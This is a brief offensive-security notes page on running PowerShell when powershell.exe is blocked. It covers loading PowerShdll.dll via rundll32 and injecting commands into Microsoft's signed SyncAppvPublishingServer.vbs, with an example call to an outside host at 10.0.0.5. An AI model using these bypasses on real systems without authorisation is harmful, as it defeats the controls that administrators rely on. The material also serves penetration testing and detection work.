# Powershell Without Powershell.exe

Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell as we know it.

If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there are ways to execute powershell still.

### PowerShdll

```
rundll32.exe PowerShdll.dll,main
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LNRJr4AeZOtVq419iAs%2F-LNRMcAXSnwHu0cxgDPL%2Fpwshll-rundll32.gif?alt=media\&token=90b69da6-c3f5-473a-9ae1-b2da202cc7dc)

Note that the same could be achieved with a compiled .exe binary from the same project, but keep in mind that .exe is more likely to run into whitelisting issues.

### SyncAppvPublishingServer

Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServer.vbs` that can be abused with code injection to execute powershell commands from a Microsoft signed script:

```
SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LNRPqoa4COCgumw-vow%2F-LNRQKQsd_KHdf5A6Hot%2Fpwshll-SyncAppvPublishingServer.png?alt=media\&token=14e48521-4437-4668-9369-6cfd4401ba59)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LNRPqoa4COCgumw-vow%2F-LNRQDdZnD2PCs4fPPCL%2Fpwshll-SyncAppvPublishingServer.gif?alt=media\&token=7da17423-04e1-4f53-9391-049dda3d783d)

### References

{% embed url="https://github.com/p3nt4/PowerShdll" %}

{% embed url="https://youtu.be/7tvfb9poTKg" %}
